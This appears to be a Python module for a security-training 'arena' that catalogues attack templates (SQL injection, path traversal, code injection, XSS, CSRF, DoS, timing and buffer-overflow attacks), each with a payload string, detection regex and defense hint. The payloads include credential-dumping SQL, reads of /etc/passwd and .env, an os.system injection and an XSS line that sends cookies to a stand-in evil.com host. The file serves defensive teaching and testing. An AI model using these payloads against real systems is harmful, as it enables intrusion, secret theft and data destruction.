"""
YeyoOS — Attack Library
Catalog of security attack types with payload templates for the YeyoHack Arena.
All attacks run in sandbox only — NEVER touch the real system.
"""
import logging
from dataclasses import dataclass, field
from enum import Enum
from typing import Optional

logger = logging.getLogger("yeyoos.arena.attacks")


class AttackType(str, Enum):
    """Categories of security attacks supported by the Arena."""

    SQL_INJECTION = "sql_injection"
    PATH_TRAVERSAL = "path_traversal"
    CODE_INJECTION = "code_injection"
    PRIVILEGE_ESCALATION = "privilege_escalation"
    RACE_CONDITION = "race_condition"
    XSS = "xss"
    CSRF = "csrf"
    DOS = "dos"
    TIMING_ATTACK = "timing_attack"
    BUFFER_OVERFLOW = "buffer_overflow"


@dataclass
class AttackTemplate:
    """A concrete attack variant with payload and detection metadata."""

    attack_type: AttackType
    name: str
    description: str
    severity: int  # 1-10
    payload_template: str
    detection_pattern: str
    success_indicators: list[str] = field(default_factory=list)
    defense_hint: str = ""

    def __post_init__(self) -> None:
        if not 1 <= self.severity <= 10:
            raise ValueError(f"severity must be 1-10, got {self.severity}")


# ---------------------------------------------------------------------------
# Attack Catalog — 2-3 variants per type
# ---------------------------------------------------------------------------

ATTACK_CATALOG: dict[AttackType, list[AttackTemplate]] = {
    # -- SQL Injection --
    AttackType.SQL_INJECTION: [
        AttackTemplate(
            attack_type=AttackType.SQL_INJECTION,
            name="Classic OR bypass",
            description="Bypass authentication with always-true condition.",
            severity=8,
            payload_template="' OR 1=1 --",
            detection_pattern=r"(?i)(or\s+1\s*=\s*1|--)",
            success_indicators=["Login successful", "Welcome admin", "rows returned"],
            defense_hint="Use parameterized queries / prepared statements.",
        ),
        AttackTemplate(
            attack_type=AttackType.SQL_INJECTION,
            name="DROP TABLE",
            description="Destructive payload that attempts to drop a table.",
            severity=10,
            payload_template="'; DROP TABLE users; --",
            detection_pattern=r"(?i)(drop\s+table)",
            success_indicators=["table dropped", "no such table"],
            defense_hint="Parameterized queries and least-privilege DB user.",
        ),
        AttackTemplate(
            attack_type=AttackType.SQL_INJECTION,
            name="UNION SELECT exfil",
            description="Exfiltrate data via UNION SELECT.",
            severity=9,
            payload_template="' UNION SELECT username, password FROM users --",
            detection_pattern=r"(?i)(union\s+select)",
            success_indicators=["username", "password", "admin"],
            defense_hint="Whitelist expected columns; use ORM query builders.",
        ),
    ],
    # -- Path Traversal --
    AttackType.PATH_TRAVERSAL: [
        AttackTemplate(
            attack_type=AttackType.PATH_TRAVERSAL,
            name="etc/passwd read",
            description="Traverse to system password file.",
            severity=7,
            payload_template="../../etc/passwd",
            detection_pattern=r"\.\./",
            success_indicators=["root:", "/bin/bash", "nobody"],
            defense_hint="Canonicalize paths; reject '..' components.",
        ),
        AttackTemplate(
            attack_type=AttackType.PATH_TRAVERSAL,
            name=".env exfil",
            description="Read application secrets from .env file.",
            severity=8,
            payload_template="../../../.env",
            detection_pattern=r"\.env",
            success_indicators=["SECRET_KEY", "DATABASE_URL", "API_KEY"],
            defense_hint="Serve files from allowed directory only.",
        ),
        AttackTemplate(
            attack_type=AttackType.PATH_TRAVERSAL,
            name="Null-byte bypass",
            description="Use null byte to bypass extension checks.",
            severity=6,
            payload_template="../../etc/passwd%00.png",
            detection_pattern=r"(%00|\\x00)",
            success_indicators=["root:", "file contents"],
            defense_hint="Strip null bytes; validate after decoding.",
        ),
    ],
    # -- Code Injection --
    AttackType.CODE_INJECTION: [
        AttackTemplate(
            attack_type=AttackType.CODE_INJECTION,
            name="os.system import",
            description="Import os module and execute shell command.",
            severity=10,
            payload_template="__import__('os').system('id')",
            detection_pattern=r"(?i)(__import__|os\.system)",
            success_indicators=["uid=", "root", "command executed"],
            defense_hint="Never eval/exec untrusted input.",
        ),
        AttackTemplate(
            attack_type=AttackType.CODE_INJECTION,
            name="eval injection",
            description="Inject code via eval().",
            severity=9,
            payload_template="eval(compile('import os; os.system(\"id\")', '<str>', 'exec'))",
            detection_pattern=r"(?i)(eval|compile|exec)",
            success_indicators=["uid=", "executed"],
            defense_hint="Remove eval/exec; use AST-based safe evaluation.",
        ),
    ],
    # -- Privilege Escalation --
    AttackType.PRIVILEGE_ESCALATION: [
        AttackTemplate(
            attack_type=AttackType.PRIVILEGE_ESCALATION,
            name="Role parameter tampering",
            description="Modify user role in request to gain admin.",
            severity=8,
            payload_template='{"username": "user", "role": "admin"}',
            detection_pattern=r'"role"\s*:\s*"admin"',
            success_indicators=["admin", "elevated", "role changed"],
            defense_hint="Enforce role on server side; ignore client role field.",
        ),
        AttackTemplate(
            attack_type=AttackType.PRIVILEGE_ESCALATION,
            name="IDOR access",
            description="Access another user's resource via direct object reference.",
            severity=7,
            payload_template="/api/users/1/profile  (as user 2)",
            detection_pattern=r"/users/\d+/",
            success_indicators=["other user data", "unauthorized access"],
            defense_hint="Check ownership on every resource access.",
        ),
    ],
    # -- Race Condition --
    AttackType.RACE_CONDITION: [
        AttackTemplate(
            attack_type=AttackType.RACE_CONDITION,
            name="Double-spend",
            description="Concurrent requests to spend the same balance twice.",
            severity=8,
            payload_template="asyncio.gather(withdraw(100), withdraw(100))  # balance=100",
            detection_pattern=r"(?i)(gather|concurrent|threading)",
            success_indicators=["balance negative", "double withdraw"],
            defense_hint="Use database-level locking or SELECT FOR UPDATE.",
        ),
        AttackTemplate(
            attack_type=AttackType.RACE_CONDITION,
            name="TOCTOU file",
            description="Time-of-check to time-of-use on file operations.",
            severity=6,
            payload_template="check(file_ok) -> swap(file) -> use(file)",
            detection_pattern=r"(?i)(toctou|check.*use|race)",
            success_indicators=["wrong file used", "swapped"],
            defense_hint="Use file locks or atomic operations.",
        ),
    ],
    # -- XSS --
    AttackType.XSS: [
        AttackTemplate(
            attack_type=AttackType.XSS,
            name="Script tag alert",
            description="Classic reflected XSS with script tag.",
            severity=7,
            payload_template="<script>alert('xss')</script>",
            detection_pattern=r"(?i)<script",
            success_indicators=["alert", "script executed", "xss"],
            defense_hint="HTML-encode output; use Content-Security-Policy.",
        ),
        AttackTemplate(
            attack_type=AttackType.XSS,
            name="IMG onerror",
            description="XSS via image error handler.",
            severity=6,
            payload_template='<img src=x onerror="alert(document.cookie)">',
            detection_pattern=r"(?i)(onerror|onload)",
            success_indicators=["cookie", "alert", "handler fired"],
            defense_hint="Sanitize HTML attributes; CSP nonce.",
        ),
        AttackTemplate(
            attack_type=AttackType.XSS,
            name="SVG onload",
            description="XSS via SVG element onload event.",
            severity=6,
            payload_template='<svg onload="fetch(\'https://evil.com/steal?c=\'+document.cookie)">',
            detection_pattern=r"(?i)(svg|onload)",
            success_indicators=["fetch", "cookie", "onload"],
            defense_hint="Strip event handlers from SVG; use DOMPurify.",
        ),
    ],
    # -- CSRF --
    AttackType.CSRF: [
        AttackTemplate(
            attack_type=AttackType.CSRF,
            name="Hidden form submit",
            description="Auto-submitting hidden form from attacker page.",
            severity=7,
            payload_template=(
                '<form action="/transfer" method="POST">'
                '<input type="hidden" name="to" value="attacker">'
                '<input type="hidden" name="amount" value="10000">'
                "</form><script>document.forms[0].submit()</script>"
            ),
            detection_pattern=r'(?i)(action=|method="POST"|csrf)',
            success_indicators=["transfer complete", "form submitted"],
            defense_hint="Use CSRF tokens; SameSite cookies.",
        ),
        AttackTemplate(
            attack_type=AttackType.CSRF,
            name="Image tag GET",
            description="Trigger state-changing GET via image src.",
            severity=5,
            payload_template='<img src="https://bank.com/transfer?to=attacker&amount=1000">',
            detection_pattern=r"(?i)(img\s+src.*transfer|csrf)",
            success_indicators=["request sent", "transfer"],
            defense_hint="Never mutate state on GET; require POST with CSRF token.",
        ),
    ],
    # -- DoS --
    AttackType.DOS: [
        AttackTemplate(
            attack_type=AttackType.DOS,
            name="Regex DoS (ReDoS)",
            description="Catastrophic backtracking in regex engine.",
            severity=7,
            payload_template="'a' * 30 + '!'  against  r'(a+)+$'",
            detection_pattern=r"(?i)(redos|a\+\)\+|backtrack)",
            success_indicators=["timeout", "hang", "cpu spike"],
            defense_hint="Use atomic groups or RE2 engine; set match timeout.",
        ),
        AttackTemplate(
            attack_type=AttackType.DOS,
            name="Zip bomb",
            description="Small compressed file that expands to huge size.",
            severity=8,
            payload_template="upload(create_zip_bomb(ratio=1000))",
            detection_pattern=r"(?i)(zip.*bomb|decompression.*ratio)",
            success_indicators=["out of memory", "disk full", "killed"],
            defense_hint="Limit decompressed size; check compression ratio.",
        ),
    ],
    # -- Timing Attack --
    AttackType.TIMING_ATTACK: [
        AttackTemplate(
            attack_type=AttackType.TIMING_ATTACK,
            name="Password char leak",
            description="Measure response time to leak password characters.",
            severity=6,
            payload_template="for c in charset: measure(login(guess+c))",
            detection_pattern=r"(?i)(timing|measure|time\.time|perf_counter)",
            success_indicators=["time difference", "character found", "leaked"],
            defense_hint="Use constant-time comparison (hmac.compare_digest).",
        ),
        AttackTemplate(
            attack_type=AttackType.TIMING_ATTACK,
            name="Token enumeration",
            description="Enumerate valid tokens via response timing.",
            severity=5,
            payload_template="for token in candidates: t = time(verify(token))",
            detection_pattern=r"(?i)(enumerate|brute.*force|timing)",
            success_indicators=["valid token", "timing delta"],
            defense_hint="Constant-time token comparison; rate limiting.",
        ),
    ],
    # -- Buffer Overflow --
    AttackType.BUFFER_OVERFLOW: [
        AttackTemplate(
            attack_type=AttackType.BUFFER_OVERFLOW,
            name="Stack smash",
            description="Overflow stack buffer to overwrite return address.",
            severity=10,
            payload_template="'A' * 1024 + shellcode_addr",
            detection_pattern=r"(?i)(overflow|buffer|stack.*smash|\* 1024)",
            success_indicators=["segfault", "shell spawned", "overwritten"],
            defense_hint="Use memory-safe languages; enable ASLR + stack canaries.",
        ),
        AttackTemplate(
            attack_type=AttackType.BUFFER_OVERFLOW,
            name="Format string",
            description="Exploit printf-style format string to read/write memory.",
            severity=9,
            payload_template="%x" * 20 + "%n",
            detection_pattern=r"(?i)(format.*string|%x|%n|printf)",
            success_indicators=["memory leak", "write primitive"],
            defense_hint="Never pass user input as format string.",
        ),
    ],
}


# ---------------------------------------------------------------------------
# Query helpers
# ---------------------------------------------------------------------------


def get_attacks_for_type(attack_type: AttackType) -> list[AttackTemplate]:
    """Return all templates for a given attack type."""
    templates = ATTACK_CATALOG.get(attack_type, [])
    if not templates:
        logger.warning("No templates found for attack type %s", attack_type)
    return templates


def get_all_attacks() -> list[AttackTemplate]:
    """Return every template across all attack types."""
    return [t for templates in ATTACK_CATALOG.values() for t in templates]


def get_attack_by_severity(min_severity: int = 1) -> list[AttackTemplate]:
    """Return templates at or above *min_severity*, sorted descending."""
    if not 1 <= min_severity <= 10:
        raise ValueError(f"min_severity must be 1-10, got {min_severity}")
    return sorted(
        [t for t in get_all_attacks() if t.severity >= min_severity],
        key=lambda t: t.severity,
        reverse=True,
    )
